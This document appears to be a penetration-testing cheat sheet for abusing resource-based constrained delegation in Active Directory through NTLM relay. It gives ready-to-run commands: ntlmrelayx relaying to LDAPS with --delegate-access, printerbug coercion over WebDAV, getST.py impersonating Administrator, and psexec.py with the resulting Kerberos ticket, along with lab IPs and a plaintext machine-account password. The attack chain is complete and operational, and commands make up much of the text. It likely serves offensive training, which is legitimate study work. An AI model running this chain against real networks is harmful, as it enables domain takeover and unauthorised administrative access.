# 12.10 RBCD Abuse via NTLM Relay

> Coerce HTTP auth via WebDAV PrinterBug → `ntlmrelayx --delegate-access` → `getST.py` → `psexec` for full RBCD via relay.

## Overview

Relay a target computer's HTTP NTLM authentication over LDAPS to the DC to set msDS-AllowedToActOnBehalfOfOtherIdentity, configuring RBCD so an attacker-controlled machine account can impersonate any user on that target. Chain: drop-sc to enable WebClient → coerce HTTP auth via WebDAV printerbug → ntlmrelayx --delegate-access → getST.py → psexec with KRB5CCNAME.

## Steps

- Requires a machine account (e.g. plaintext$ created via LDAP relay)
- Target must have WebClient running (coerce HTTP auth, not SMB, to bypass signing)
- Use drop-sc on writable shares to start WebClient on target
- Verify WebClient with CME webdav module
- Run ntlmrelayx targeting LDAPS with --delegate-access and --escalate-user plaintext$
- Coerce target using printerbug with WebDAV connection string as listener
- Use getST.py -spn cifs/FQDN -impersonate Administrator to get service ticket
- Pass-the-ticket with psexec.py -k -no-pass using KRB5CCNAME env var

## Commands

### RBCD ntlmrelayx

```bash
sudo ntlmrelayx.py -t ldaps://<DOMAIN>\\'SQL01$'@172.16.117.3 --delegate-access --escalate-user 'plaintext$' --no-smb-server --no-dump
```

### Coerce target via WebDAV

```bash
python3 printerbug.py <DOMAIN>/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.60 LINUX01@80/print
```

### Get service ticket (impersonate)

```bash
getST.py -spn cifs/sql01.<DOMAIN>.local -impersonate Administrator -dc-ip 172.16.117.3 "<DOMAIN>"/"plaintext$":"o6@ekK5#rlw2rAe"
```

### psexec with ticket

```bash
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass sql01.<DOMAIN>.local
```
